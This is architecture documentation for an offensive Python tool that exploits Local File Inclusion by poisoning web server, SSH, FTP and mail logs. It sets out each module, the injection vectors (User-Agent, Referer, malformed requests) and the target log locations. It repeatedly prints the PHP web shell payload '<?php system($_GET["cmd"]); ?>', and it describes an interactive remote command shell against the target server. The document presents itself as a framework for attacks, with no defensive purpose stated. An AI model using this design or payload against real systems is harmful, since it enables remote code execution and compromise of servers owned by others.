# Log Poisoning Script - Architecture Documentation

## Table of Contents
1. [Overview](#overview)
2. [High-Level Architecture](#high-level-architecture)
3. [Module Breakdown](#module-breakdown)
4. [Data Flow](#data-flow)
5. [Function Relationships](#function-relationships)
6. [Design Patterns](#design-patterns)
7. [Execution Flows](#execution-flows)

---

## Overview

The log poisoning script is a modular Python application designed to exploit Local File Inclusion (LFI) vulnerabilities through log file poisoning. The architecture follows SOLID principles with clear separation of concerns across multiple specialized modules.

### Core Purpose
- Scan web servers for readable log files via LFI vulnerabilities
- Inject malicious PHP payloads into log files
- Execute arbitrary commands on the target system
- Provide both interactive and single-command execution modes

---

## High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                         log_poison.py                           │
│                      (Entry Point/CLI)                          │
│                                                                 │
│  Parses command-line arguments and initializes application     │
└────────────────────────────┬────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                           app.py                                │
│                  (Application Orchestrator)                     │
│                                                                 │
│  ┌─────────────┐  ┌──────────────┐  ┌─────────────────┐       │
│  │   Config    │  │  LogScanner  │  │ UserInterface   │       │
│  └─────────────┘  └──────────────┘  └─────────────────┘       │
│                                                                 │
│  ┌─────────────┐  ┌──────────────┐  ┌─────────────────┐       │
│  │ HttpClient  │  │  Strategy    │  │ CommandExecutor │       │
│  │             │  │   Factory    │  │                 │       │
│  └─────────────┘  └──────────────┘  └─────────────────┘       │
└─────────────────────────────────────────────────────────────────┘
                             │
          ┌──────────────────┼──────────────────┐
          ▼                  ▼                  ▼
    ┌──────────┐      ┌─────────────┐    ┌──────────┐
    │  HTTP    │      │  Poisoning  │    │  Output  │
    │  Client  │      │  Strategies │    │  Parser  │
    └──────────┘      └─────────────┘    └──────────┘
```

---

## Module Breakdown

### 1. **log_poison.py** - Entry Point

**Purpose:** Command-line interface and application bootstrap

```
┌────────────────────────────────────────────────────────┐
│                    log_poison.py                       │
├────────────────────────────────────────────────────────┤
│                                                        │
│  main()                                                │
│  ├─► Parse CLI arguments (argparse)                   │
│  │   • -u/--url: Target URL                           │
│  │   • -p/--param: LFI parameter name                 │
│  │   • -c/--command: Single command mode              │
│  │   • -l/--log: Specific log file                    │
│  │                                                     │
│  ├─► Create LogPoisoningApp instance                  │
│  │                                                     │
│  ├─► Execute app.run()                                │
│  │                                                     │
│  └─► Handle exceptions and cleanup                    │
│      • KeyboardInterrupt                              │
│      • General exceptions                             │
│      • Resource cleanup                               │
│                                                        │
└────────────────────────────────────────────────────────┘

User Input → CLI Parser → App Creation → Execution → Cleanup
```

**Key Function:**
- `main()`: Orchestrates the entire application lifecycle

---

### 2. **config.py** - Configuration Management

**Purpose:** Centralized configuration and data structures

```
┌──────────────────────────────────────────────────────────┐
│                       config.py                          │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  @dataclass LogLocation                                  │
│  ├─ paths: List[str]        (Log file paths)            │
│  ├─ method: str             (Poisoning method)          │
│  └─ description: str        (Human-readable desc)       │
│                                                          │
│  @dataclass Config                                       │
│  ├─ default_user_agent: str                             │
│  ├─ request_timeout: int                                │
│  ├─ max_output_lines: int                               │
│  ├─ max_content_preview: int                            │
│  │                                                       │
│  ├─ log_locations: Dict[str, LogLocation]               │
│  │   ├─► apache_access    (User-Agent poisoning)       │
│  │   ├─► nginx_access     (User-Agent poisoning)       │
│  │   ├─► apache_error     (Malformed request)          │
│  │   ├─► nginx_error      (Malformed request)          │
│  │   ├─► ssh              (Username poisoning)         │
│  │   ├─► ftp              (Username poisoning)         │
│  │   ├─► mail             (Email field poisoning)      │
│  │   └─► proc_environ     (User-Agent poisoning)       │
│  │                                                       │
│  └─ log_indicators: List[str]                           │
│      (Patterns to identify log content)                 │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

**Key Components:**
- `LogLocation`: Data structure for log file metadata
- `Config`: Application-wide configuration with default values

---

### 3. **http_client.py** - HTTP Communication

**Purpose:** Abstract HTTP requests to the target server

```
┌────────────────────────────────────────────────────┐
│                  http_client.py                    │
├────────────────────────────────────────────────────┤
│                                                    │
│  class HttpClient                                  │
│                                                    │
│  __init__(timeout)                                 │
│  ├─► Create requests.Session()                    │
│  └─► Store timeout value                          │
│                                                    │
│  get(url, headers=None)                            │
│  ├─► Perform GET request via session              │
│  ├─► Apply custom headers if provided             │
│  ├─► Enforce timeout                              │
│  └─► Return response object                       │
│                                                    │
│  close()                                           │
│  └─► Close session and cleanup                    │
│                                                    │
└────────────────────────────────────────────────────┘

                     Usage Flow:
                          
    Caller → get(url, headers) → Session → Target Server
                                      ↓
                                  Response
```

**Key Functions:**
- `get()`: Execute HTTP GET requests
- `close()`: Clean up session resources

---

### 4. **log_scanner.py** - Vulnerability Detection

**Purpose:** Scan for readable log files via LFI

```
┌───────────────────────────────────────────────────────────┐
│                     log_scanner.py                        │
├───────────────────────────────────────────────────────────┤
│                                                           │
│  @dataclass VulnerableLog                                │
│  ├─ path: str                                            │
│  ├─ log_type: str                                        │
│  ├─ method: str                                          │
│  ├─ description: str                                     │
│  └─ content_preview: str                                 │
│                                                           │
│  class LogScanner                                        │
│                                                           │
│  __init__(http_client, target_url, param, config)       │
│  └─► Initialize with dependencies                       │
│                                                           │
│  test_log_readability(log_path)                          │
│  ├─► Build test URL: target?param=log_path              │
│  ├─► Send GET request via http_client                   │
│  ├─► Check response status (200 OK)                     │
│  ├─► Search for log indicators in content               │
│  │   (GET/, POST/, User-Agent:, HTTP/, etc.)            │
│  └─► Return (is_readable, content)                      │
│                                                           │
│  scan_all_logs()                                         │
│  ├─► Iterate through config.log_locations               │
│  ├─► For each log type:                                 │
│  │   └─► For each path:                                 │
│  │       ├─► Call test_log_readability()                │
│  │       └─► If readable: create VulnerableLog          │
│  └─► Return list of vulnerable logs                     │
│                                                           │
└───────────────────────────────────────────────────────────┘

                Scanning Flow:
                     
Config Logs → For Each Type → For Each Path → Test
                                                 ↓
                                            Readable?
                                                 ↓
                                          VulnerableLog
```

**Key Functions:**
- `test_log_readability()`: Test if a single log file is accessible
- `scan_all_logs()`: Comprehensive scan of all configured logs

---

### 5. **poisoning_strategies.py** - Strategy Pattern

**Purpose:** Implement different log poisoning techniques

```
┌─────────────────────────────────────────────────────────────┐
│                  poisoning_strategies.py                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ABC: PoisoningStrategy                                     │
│  ├─► __init__(http_client, default_ua)                     │
│  └─► @abstractmethod poison(...)                           │
│                                                             │
│  ┌───────────────────────────────────────────────┐         │
│  │      Concrete Strategy Implementations        │         │
│  └───────────────────────────────────────────────┘         │
│                                                             │
│  UserAgentPoisoning                                         │
│  ├─► poison(target_url, param, log_path, payload)          │
│  │   ├─► Create URL: target?param=log_path                 │
│  │   ├─► Set headers: {'User-Agent': payload}              │
│  │   ├─► Send GET request                                  │
│  │   └─► Return success status                             │
│  │                                                          │
│  │   Flow: Request → User-Agent Header → Access Log        │
│  │                                                          │
│  MalformedRequestPoisoning                                  │
│  ├─► poison(target_url, param, log_path, payload)          │
│  │   ├─► Create URL: target?param=URL_ENCODE(payload)      │
│  │   ├─► Send GET request (causes error)                   │
│  │   └─► Return success status                             │
│  │                                                          │
│  │   Flow: Bad Request → Error → Error Log                 │
│  │                                                          │
│  RefererPoisoning                                           │
│  ├─► poison(target_url, param, log_path, payload)          │
│  │   ├─► Create URL: target?param=log_path                 │
│  │   ├─► Set headers: {'Referer': payload}                 │
│  │   ├─► Send GET request                                  │
│  │   └─► Return success status                             │
│  │                                                          │
│  │   Flow: Request → Referer Header → Access Log           │
│  │                                                          │
│  └───────────────────────────────────────────────┘         │
│                                                             │
│  PoisoningStrategyFactory                                   │
│  └─► create(method, http_client, default_ua)               │
│      ├─► Map method name to strategy class                 │
│      │   • 'user_agent' → UserAgentPoisoning               │
│      │   • 'malformed_request' → MalformedRequestPoisoning │
│      │   • 'referer' → RefererPoisoning                    │
│      │   • 'ssh_username' → UserAgentPoisoning (fallback)  │
│      │   • 'ftp_username' → UserAgentPoisoning (fallback)  │
│      │   • 'mail_field' → UserAgentPoisoning (fallback)    │
│      └─► Return strategy instance                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘

            Strategy Selection Flow:
                     
Method Name → Factory.create() → Strategy Class → Instance
                                                      ↓
                                              poison() method
```

**Key Functions:**
- `poison()`: Abstract method implemented by each strategy
- `PoisoningStrategyFactory.create()`: Factory method for strategy instantiation

---

### 6. **command_executor.py** - Command Execution

**Purpose:** Execute system commands via poisoned logs

```
┌──────────────────────────────────────────────────────────┐
│                  command_executor.py                     │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  class CommandExecutor                                   │
│                                                          │
│  __init__(http_client, strategy, target_url,            │
│           param, log_path, config)                       │
│  ├─► Store all dependencies                             │
│  └─► Set payload: '<?php system($_GET["cmd"]); ?>'      │
│                                                          │
│  execute(command)                                        │
│  ├─► Step 1: Re-poison the log                          │
│  │   └─► strategy.poison(..., payload)                  │
│  │                                                       │
│  ├─► Step 2: Build execution URL                        │
│  │   └─► target?param=log_path&cmd=URL_ENCODE(command)  │
│  │                                                       │
│  ├─► Step 3: Send request with default User-Agent       │
│  │   └─► http_client.get(exec_url, headers)             │
│  │                                                       │
│  ├─► Step 4: Parse response                             │
│  │   └─► OutputParser.parse(response.text, ...)         │
│  │                                                       │
│  └─► Return: command output or error message            │
│                                                          │
└──────────────────────────────────────────────────────────┘

              Command Execution Flow:
                       
   command
      ↓
   Re-poison Log ───► Log File Contains: <?php system($_GET["cmd"]); ?>
      ↓
   Build URL ───────► target?param=log&cmd=command
      ↓
   Send Request ────► Server includes log (LFI)
      ↓
   PHP Executes ────► system(command)
      ↓
   Parse Output ────► Clean command output
      ↓
   Return Result
```

**Key Functions:**
- `execute()`: Complete command execution cycle with re-poisoning

---

### 7. **output_parser.py** - Response Processing

**Purpose:** Extract clean command output from HTML responses

```
┌─────────────────────────────────────────────────────────┐
│                   output_parser.py                      │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  class OutputParser                                     │
│                                                         │
│  @staticmethod parse(html, command, max_lines)          │
│  ├─► Step 1: Parse HTML with BeautifulSoup             │
│  │                                                      │
│  ├─► Step 2: Remove unwanted elements                  │
│  │   └─► script, style, header, footer, nav            │
│  │                                                      │
│  ├─► Step 3: Extract text content                      │
│  │   └─► soup.get_text()                               │
│  │                                                      │
│  ├─► Step 4: Clean and split into lines                │
│  │   └─► Strip whitespace, filter empty lines          │
│  │                                                      │
│  ├─► Step 5: Find relevant output                      │
│  │   └─► _find_output(lines, command)                  │
│  │                                                      │
│  └─► Step 6: Return limited output (max_lines)         │
│                                                         │
│  @staticmethod _find_output(lines, command)             │
│  ├─► Skip HTML/page structure patterns                 │
│  │   (<!doctype, <html>, etc.)                         │
│  │                                                      │
│  ├─► Look for command output indicators                │
│  │   • Command string itself                           │
│  │   • Common output patterns (uid=, total, root:)     │
│  │                                                      │
│  ├─► Collect relevant lines                            │
│  │   └─► Filter lines < 500 chars                      │
│  │                                                      │
│  └─► Return: List of output lines                      │
│                                                         │
└─────────────────────────────────────────────────────────┘

            Parsing Flow:
                 
Raw HTML → Parse DOM → Remove Clutter → Extract Text
                                             ↓
                                        Split Lines
                                             ↓
                                        Find Output
                                             ↓
                                      Clean Command Output
```

**Key Functions:**
- `parse()`: Main parsing logic
- `_find_output()`: Intelligent output detection

---

### 8. **ui.py** - User Interface

**Purpose:** Handle user interaction and display

```
┌──────────────────────────────────────────────────────────┐
│                         ui.py                            │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  class UserInterface                                     │
│                                                          │
│  @staticmethod display_header(target_url, param)         │
│  └─► Print banner with target info                      │
│                                                          │
│  @staticmethod display_vulnerable_logs(vulnerable_logs)  │
│  ├─► Print formatted list of found logs                 │
│  ├─► Show: index, description, path, method, preview    │
│  └─► Pretty formatting with colors                      │
│                                                          │
│  @staticmethod select_log(vulnerable_logs)               │
│  ├─► Display vulnerable logs                            │
│  ├─► Prompt user for selection (1-N)                    │
│  ├─► Validate input                                     │
│  ├─► Default to first log if empty                      │
│  └─► Return: selected VulnerableLog or None             │
│                                                          │
│  @staticmethod run_interactive_shell(executor,           │
│                                      log_path, method)   │
│  ├─► Print shell header                                 │
│  ├─► Loop:                                              │
│  │   ├─► Display prompt: $ (green)                      │
│  │   ├─► Read command from user                         │
│  │   ├─► Check for exit/quit                            │
│  │   ├─► Execute command via executor                   │
│  │   ├─► Print output                                   │
│  │   └─► Handle exceptions and interrupts               │
│  └─► Exit on quit or Ctrl+C                             │
│                                                          │
│  @staticmethod run_single_command(executor, command)     │
│  ├─► Print execution header                             │
│  ├─► Execute command via executor                       │
│  ├─► Print formatted output                             │
│  └─► Exit                                               │
│                                                          │
└──────────────────────────────────────────────────────────┘

        Interactive Shell Flow:
             
    Display Shell Header
            ↓
         Show Prompt
            ↓
        Read Command ──────────► exit/quit?
            ↓                         ↓
     Execute Command               Exit Shell
            ↓
      Display Output
            ↓
         (Repeat)
```

**Key Functions:**
- `display_header()`: Show application banner
- `display_vulnerable_logs()`: Format and display found logs
- `select_log()`: Interactive log selection
- `run_interactive_shell()`: REPL-style command execution
- `run_single_command()`: One-time command execution

---

### 9. **app.py** - Application Orchestrator

**Purpose:** Coordinate all components and control application flow

```
┌──────────────────────────────────────────────────────────────┐
│                          app.py                              │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  class LogPoisoningApp                                       │
│                                                              │
│  __init__(target_url, param)                                │
│  ├─► Store target_url and param                             │
│  ├─► Create Config instance                                 │
│  ├─► Create HttpClient instance                             │
│  ├─► Create LogScanner instance                             │
│  └─► Create UserInterface instance                          │
│                                                              │
│  _find_log_info(log_path) [PRIVATE]                         │
│  ├─► Check if log_path matches known log type               │
│  ├─► If known: Create VulnerableLog with proper metadata    │
│  └─► If unknown: Create VulnerableLog with defaults         │
│                                                              │
│  _setup_executor(log) [PRIVATE]                             │
│  ├─► Create poisoning strategy via Factory                  │
│  │   └─► PoisoningStrategyFactory.create(log.method)        │
│  │                                                           │
│  ├─► Create CommandExecutor instance                        │
│  │   └─► Pass: http_client, strategy, urls, log_path       │
│  │                                                           │
│  ├─► Test poisoning with payload                            │
│  │   └─► strategy.poison(..., '<?php system(...); ?>')     │
│  │                                                           │
│  └─► Return: CommandExecutor or None on failure             │
│                                                              │
│  run(command=None, log_path=None)                           │
│  ├─► Display application header                             │
│  │                                                           │
│  ├─► Branch 1: Specific log provided                        │
│  │   ├─► Test log readability                               │
│  │   └─► Create VulnerableLog object                        │
│  │                                                           │
│  ├─► Branch 2: No log provided (scan mode)                  │
│  │   ├─► scanner.scan_all_logs()                            │
│  │   ├─► Check if logs found                                │
│  │   └─► ui.select_log()                                    │
│  │                                                           │
│  ├─► Setup command executor                                 │
│  │   └─► _setup_executor(selected_log)                      │
│  │                                                           │
│  ├─► Branch A: Single command mode                          │
│  │   └─► ui.run_single_command(executor, command)           │
│  │                                                           │
│  ├─► Branch B: Interactive mode                             │
│  │   └─► ui.run_interactive_shell(executor, log, method)    │
│  │                                                           │
│  └─► Return success status                                  │
│                                                              │
│  cleanup()                                                   │
│  └─► Close http_client session                              │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

---

## Data Flow

### Complete Attack Flow

```
┌────────────────────────────────────────────────────────────────┐
│                    COMPLETE DATA FLOW                          │
└────────────────────────────────────────────────────────────────┘

1. INITIALIZATION
   ════════════════
   CLI Args → log_poison.main() → LogPoisoningApp.__init__()
                                          ↓
                                    Create Dependencies:
                                    • Config
                                    • HttpClient
                                    • LogScanner
                                    • UserInterface

2. LOG DISCOVERY (if no log specified)
   ═══════════════════════════════════
   app.run() → scanner.scan_all_logs()
                      ↓
                Config.log_locations
                      ↓
              For Each Log Type:
                      ↓
          ┌─────────────────────────┐
          │  For Each Log Path:     │
          │                         │
          │  test_log_readability() │
          │         ↓               │
          │  Build URL:             │
          │  target?param=log_path  │
          │         ↓               │
          │  http_client.get()      │
          │         ↓               │
          │  Check indicators       │
          │         ↓               │
          │  Readable? ───Yes──►    │
          │     │                   │
          │     No                  │
          │     ↓                   │
          │   Skip                  │
          └─────────────────────────┘
                      ↓
            List[VulnerableLog]
                      ↓
            ui.select_log()
                      ↓
            User Selection
                      ↓
          selected_log: VulnerableLog

3. EXECUTOR SETUP
   ═══════════════
   app._setup_executor(log)
           ↓
   PoisoningStrategyFactory.create(log.method)
           ↓
   ┌─────────────────────┐
   │  Strategy Instance  │
   │  • UserAgent        │
   │  • MalformedRequest │
   │  • Referer          │
   └─────────────────────┘
           ↓
   CommandExecutor(http_client, strategy, ...)
           ↓
   Test Poisoning:
   strategy.poison(..., '<?php system($_GET["cmd"]); ?>')
           ↓
   Success? → Return CommandExecutor
   Failure? → Return None

4. COMMAND EXECUTION (Interactive or Single)
   ═══════════════════════════════════════════
   
   A. Interactive Mode:
      ────────────────
      ui.run_interactive_shell()
              ↓
      Loop Forever:
              ↓
         Show Prompt
              ↓
         Read Command ──────► exit? → Break
              ↓
         executor.execute(command)
              ↓
         Display Output
              ↓
         Continue Loop
   
   B. Single Command:
      ───────────────
      ui.run_single_command()
              ↓
      executor.execute(command)
              ↓
      Display Output
              ↓
      Exit

5. COMMAND EXECUTION DETAIL
   ═════════════════════════
   executor.execute(command)
           ↓
   ┌───────────────────────────────────────┐
   │ STEP 1: Re-Poison Log                │
   │ strategy.poison(payload)              │
   │         ↓                             │
   │ Example (UserAgent):                  │
   │ • URL: target?param=log_path          │
   │ • Headers: {'User-Agent': payload}    │
   │ • GET Request → Log File Updated      │
   └───────────────────────────────────────┘
           ↓
   ┌───────────────────────────────────────┐
   │ STEP 2: Build Execution URL           │
   │ target?param=log_path&cmd=command     │
   └───────────────────────────────────────┘
           ↓
   ┌───────────────────────────────────────┐
   │ STEP 3: Execute via LFI               │
   │ http_client.get(exec_url)             │
   │         ↓                             │
   │ Server includes log file (LFI)        │
   │         ↓                             │
   │ PHP code executes: system(command)    │
   │         ↓                             │
   │ Command output in response            │
   └───────────────────────────────────────┘
           ↓
   ┌───────────────────────────────────────┐
   │ STEP 4: Parse Output                  │
   │ OutputParser.parse(response.text)     │
   │         ↓                             │
   │ • Parse HTML with BeautifulSoup       │
   │ • Remove clutter (scripts, styles)    │
   │ • Extract text content                │
   │ • Find relevant output lines          │
   │ • Return clean output                 │
   └───────────────────────────────────────┘
           ↓
      Clean Output String
           ↓
      Return to Caller

6. CLEANUP
   ════════
   app.cleanup()
           ↓
   http_client.close()
           ↓
   Session Closed
```

---

## Function Relationships

### Dependency Graph

```
┌──────────────────────────────────────────────────────────────┐
│                    DEPENDENCY GRAPH                          │
└──────────────────────────────────────────────────────────────┘

log_poison.main()
    │
    └──► LogPoisoningApp(target_url, param)
            │
            ├──► Config()
            │       └──► Provides: log_locations, settings
            │
            ├──► HttpClient(timeout)
            │       ├──► requests.Session()
            │       └──► Used by: LogScanner, Strategies, Executor
            │
            ├──► LogScanner(http_client, url, param, config)
            │       ├── Uses: HttpClient
            │       ├── Uses: Config
            │       └── Returns: List[VulnerableLog]
            │
            └──► UserInterface()
                    ├── No dependencies (static methods)
                    └── Uses: CommandExecutor for execution

LogPoisoningApp.run()
    │
    ├──► LogScanner.scan_all_logs()
    │       └──► For each log: test_log_readability()
    │               └──► HttpClient.get()
    │
    ├──► UserInterface.select_log()
    │
    ├──► PoisoningStrategyFactory.create()
    │       └──► Returns: PoisoningStrategy instance
    │               ├── UserAgentPoisoning
    │               ├── MalformedRequestPoisoning
    │               └── RefererPoisoning
    │
    ├──► CommandExecutor(http_client, strategy, ...)
    │       ├── Uses: HttpClient
    │       ├── Uses: PoisoningStrategy
    │       └── Uses: OutputParser
    │
    └──► UserInterface.run_interactive_shell() OR
         UserInterface.run_single_command()
             └──► CommandExecutor.execute()
                     ├──► PoisoningStrategy.poison()
                     │       └──► HttpClient.get()
                     │
                     ├──► HttpClient.get(exec_url)
                     │
                     └──► OutputParser.parse()
                             └──► BeautifulSoup

┌────────────────────────────────────────────────────────┐
│                MODULE COUPLING                         │
└────────────────────────────────────────────────────────┘

Strong Dependencies:
    LogPoisoningApp  ──► Config (configuration data)
    LogPoisoningApp  ──► HttpClient (network communication)
    LogScanner       ──► HttpClient (testing log readability)
    CommandExecutor  ──► HttpClient (sending requests)
    CommandExecutor  ──► PoisoningStrategy (log poisoning)
    CommandExecutor  ──► OutputParser (parsing responses)

Weak Dependencies:
    LogPoisoningApp  ──► UserInterface (display only)
    PoisoningStrategy ──► HttpClient (injected dependency)

Independent Modules:
    Config          (pure data)
    OutputParser    (static utility)
    UserInterface   (static utility)
```

---

## Design Patterns

### 1. Strategy Pattern (Poisoning Strategies)

```
┌─────────────────────────────────────────────────────────┐
│              STRATEGY PATTERN IMPLEMENTATION            │
└─────────────────────────────────────────────────────────┘

                    ┌───────────────────┐
                    │ PoisoningStrategy │
                    │     (Abstract)    │
                    └─────────┬─────────┘
                              │
                    ┌─────────┴─────────┐
                    │  poison(...)      │
                    │  (abstract)       │
                    └───────────────────┘
                              △
                              │ Inheritance
            ┌─────────────────┼─────────────────┐
            │                 │                 │
┌───────────┴──────────┐ ┌────┴─────────┐ ┌────┴──────────┐
│ UserAgentPoisoning   │ │ Malformed    │ │   Referer     │
│                      │ │ Request      │ │  Poisoning    │
│ poison():            │ │ Poisoning    │ │               │
│  • Inject via        │ │              │ │ poison():     │
│    User-Agent header │ │ poison():    │ │  • Inject via │
│  • Used for access   │ │  • Inject via│ │    Referer    │
│    logs              │ │    malformed │ │    header     │
└──────────────────────┘ │    param     │ └───────────────┘
                         │  • Used for  │
                         │    error logs│
                         └──────────────┘

Context: CommandExecutor
    • Holds reference to PoisoningStrategy
    • Calls strategy.poison() without knowing concrete type
    • Strategy can be swapped at runtime

Benefits:
    • Each strategy encapsulates a poisoning method
    • Easy to add new strategies (Open/Closed Principle)
    • CommandExecutor doesn't need to know implementation details
```

### 2. Factory Pattern (Strategy Creation)

```
┌──────────────────────────────────────────────────────────┐
│             FACTORY PATTERN IMPLEMENTATION               │
└──────────────────────────────────────────────────────────┘

PoisoningStrategyFactory
        │
        │ create(method, http_client, default_ua)
        │
        ├─► method == 'user_agent'
        │       └──► return UserAgentPoisoning(...)
        │
        ├─► method == 'malformed_request'
        │       └──► return MalformedRequestPoisoning(...)
        │
        ├─► method == 'referer'
        │       └──► return RefererPoisoning(...)
        │
        └─► method unknown
                └──► raise ValueError

Benefits:
    • Centralized object creation
    • Abstracts away instantiation logic
    • Easy to extend with new strategies
```

### 3. Dependency Injection

```
┌──────────────────────────────────────────────────────────┐
│          DEPENDENCY INJECTION IMPLEMENTATION             │
└──────────────────────────────────────────────────────────┘

LogPoisoningApp creates dependencies:
    
    config = Config()
    http_client = HttpClient(timeout)
    scanner = LogScanner(http_client, url, param, config)
                         ↑            ↑     ↑      ↑
                         └────────────┴─────┴──────┘
                         Injected Dependencies
    
    executor = CommandExecutor(
        http_client,    ← Injected
        strategy,       ← Injected
        target_url,
        param,
        log_path,
        config          ← Injected
    )

Benefits:
    • Loose coupling between components
    • Easy to test (can inject mocks)
    • Single Responsibility Principle
    • Inversion of Control
```

### 4. Single Responsibility Principle

```
┌──────────────────────────────────────────────────────────┐
│       SINGLE RESPONSIBILITY PRINCIPLE (SRP)              │
└──────────────────────────────────────────────────────────┘

Each module has ONE reason to change:

Config            → Configuration changes
HttpClient        → HTTP communication changes
LogScanner        → Log detection logic changes
PoisoningStrategy → Poisoning technique changes
CommandExecutor   → Command execution logic changes
OutputParser      → Output parsing logic changes
UserInterface     → UI/display changes
LogPoisoningApp   → Application flow changes

Each class has ONE job:

HttpClient        → Make HTTP requests
LogScanner        → Find readable logs
CommandExecutor   → Execute commands
OutputParser      → Parse responses
UserInterface     → Display information
```

---

## Execution Flows

### Flow 1: Scan and Interactive Mode

```
┌──────────────────────────────────────────────────────────┐
│     EXECUTION FLOW: SCAN + INTERACTIVE MODE              │
│     Command: python log_poison.py -u http://target.com   │
└──────────────────────────────────────────────────────────┘

START
  │
  ├─► Parse Arguments (no -c, no -l)
  │
  ├─► Create LogPoisoningApp
  │   ├─► Initialize Config
  │   ├─► Initialize HttpClient
  │   ├─► Initialize LogScanner
  │   └─► Initialize UserInterface
  │
  ├─► app.run(command=None, log_path=None)
  │   │
  │   ├─► ui.display_header()
  │   │   └─► Print: Target URL, Parameter
  │   │
  │   ├─► scanner.scan_all_logs()
  │   │   ├─► For each log type in config:
  │   │   │   ├─► For each path:
  │   │   │   │   ├─► test_log_readability()
  │   │   │   │   ├─► Build: target?param=path
  │   │   │   │   ├─► http_client.get()
  │   │   │   │   └─► Check indicators
  │   │   │   └─► Collect readable logs
  │   │   └─► Return: [VulnerableLog, ...]
  │   │
  │   ├─► ui.select_log()
  │   │   ├─► Display found logs
  │   │   ├─► Prompt user for selection
  │   │   └─► Return: selected VulnerableLog
  │   │
  │   ├─► _setup_executor(selected_log)
  │   │   ├─► Factory.create(log.method)
  │   │   │   └─► Return: Strategy instance
  │   │   ├─► Create CommandExecutor
  │   │   ├─► Test poison with payload
  │   │   └─► Return: CommandExecutor
  │   │
  │   └─► ui.run_interactive_shell(executor, ...)
  │       │
  │       └─► LOOP:
  │           ├─► Display prompt: $
  │           ├─► Read command
  │           ├─► executor.execute(command)
  │           │   ├─► Re-poison log
  │           │   ├─► Build exec URL
  │           │   ├─► http_client.get()
  │           │   ├─► OutputParser.parse()
  │           │   └─► Return: output
  │           ├─► Print output
  │           └─► Repeat
  │
  └─► app.cleanup()
      └─► http_client.close()
END
```

### Flow 2: Single Command Mode

```
┌──────────────────────────────────────────────────────────┐
│     EXECUTION FLOW: SINGLE COMMAND MODE                  │
│     Command: python log_poison.py -u URL -c "whoami"     │
└──────────────────────────────────────────────────────────┘

START
  │
  ├─► Parse Arguments (has -c)
  │   └─► command = "whoami"
  │
  ├─► Create LogPoisoningApp
  │
  ├─► app.run(command="whoami", log_path=None)
  │   │
  │   ├─► ui.display_header()
  │   │
  │   ├─► scanner.scan_all_logs()
  │   │   └─► Return: [VulnerableLog, ...]
  │   │
  │   ├─► ui.select_log()
  │   │   └─► Return: selected VulnerableLog
  │   │
  │   ├─► _setup_executor(selected_log)
  │   │   └─► Return: CommandExecutor
  │   │
  │   └─► ui.run_single_command(executor, "whoami")
  │       │
  │       ├─► executor.execute("whoami")
  │       │   ├─► Re-poison log
  │       │   ├─► Build URL with cmd=whoami
  │       │   ├─► http_client.get()
  │       │   ├─► OutputParser.parse()
  │       │   └─► Return: "www-data"
  │       │
  │       └─► Print output
  │
  └─► app.cleanup()
END
```

### Flow 3: Specific Log Mode

```
┌──────────────────────────────────────────────────────────┐
│     EXECUTION FLOW: SPECIFIC LOG MODE                    │
│     Command: python log_poison.py -u URL                 │
│              -l /var/log/apache2/access.log -c "id"      │
└──────────────────────────────────────────────────────────┘

START
  │
  ├─► Parse Arguments (has -l and -c)
  │   ├─► command = "id"
  │   └─► log_path = "/var/log/apache2/access.log"
  │
  ├─► Create LogPoisoningApp
  │
  ├─► app.run(command="id", log_path="/var/log/apache2/access.log")
  │   │
  │   ├─► ui.display_header()
  │   │
  │   ├─► Branch: log_path provided
  │   │   ├─► scanner.test_log_readability(log_path)
  │   │   │   └─► Return: (True, content)
  │   │   │
  │   │   └─► _find_log_info(log_path)
  │   │       ├─► Match against config.log_locations
  │   │       └─► Return: VulnerableLog
  │   │
  │   ├─► _setup_executor(selected_log)
  │   │   └─► Return: CommandExecutor
  │   │
  │   └─► ui.run_single_command(executor, "id")
  │       ├─► executor.execute("id")
  │       └─► Print output: "uid=33(www-data) ..."
  │
  └─► app.cleanup()
END
```

---

## Summary

### Key Architectural Principles

1. **Separation of Concerns**: Each module handles a specific aspect
   - `http_client.py`: Network communication
   - `log_scanner.py`: Vulnerability detection
   - `poisoning_strategies.py`: Exploitation techniques
   - `command_executor.py`: Command execution
   - `output_parser.py`: Response processing
   - `ui.py`: User interaction
   - `config.py`: Configuration
   - `app.py`: Orchestration

2. **SOLID Principles**:
   - **S**ingle Responsibility: Each class has one job
   - **O**pen/Closed: Extensible via strategies
   - **L**iskov Substitution: Strategies are interchangeable
   - **I**nterface Segregation: Focused interfaces
   - **D**ependency Inversion: Depend on abstractions

3. **Design Patterns**:
   - Strategy Pattern: Multiple poisoning methods
   - Factory Pattern: Strategy creation
   - Dependency Injection: Loose coupling

4. **Flow Control**:
   - Linear flow for simple operations
   - Conditional branching for modes
   - Loop-based for interactive shell

### Component Communication

```
CLI → App → Scanner → HttpClient → Target
       ↓
    Factory → Strategy → HttpClient → Target
       ↓
    Executor → Strategy → HttpClient → Target
       ↓              ↓
    Parser ←─────────┘
       ↓
      UI → User
```

This architecture provides a clean, maintainable, and extensible framework for log poisoning attacks with clear separation between discovery, exploitation, and interaction layers.
